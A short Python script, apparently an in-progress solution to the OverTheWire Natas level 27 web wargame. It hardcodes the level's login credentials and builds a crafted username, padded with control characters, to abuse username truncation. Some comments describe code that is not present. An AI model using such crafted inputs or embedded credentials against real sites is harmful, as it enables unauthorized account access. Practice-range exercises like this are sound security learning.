import os
import urllib.request as url
import urllib.parse
import string
import time

NATAS_URL = 'http://natas27.natas.labs.overthewire.org/index.php'
NATAS_USERNAME = 'natas27'
NATAS_PWD = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'


def initialPageConnexion():
    '''
    Connects to the page with the given credentials. This function
    has to be called before trying anything on the webpage.
    '''
    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password(
        'Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    # This commented out tactic also works. The website accepts the Authorization header
    # after having connected at least once

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    # with open('output.html', 'w') as file:
    #     file.write(output.read().decode())


if __name__ == "__main__":

    initialPageConnexion()

    # =======================================================================================
    # This part creates a list of letters that are in the password. I commented it out
    # because it takes some time to run so I want to avoid running it too often
    # =======================================================================================

    user = 'natas27' + chr(0x1a) * 70 + 'asd'
    print(user)
    # my_url = NATAS_URL + f'?username={user}&passwd={passwd}'
    # output = url.urlopen(my_url)

    # print(output.read().decode())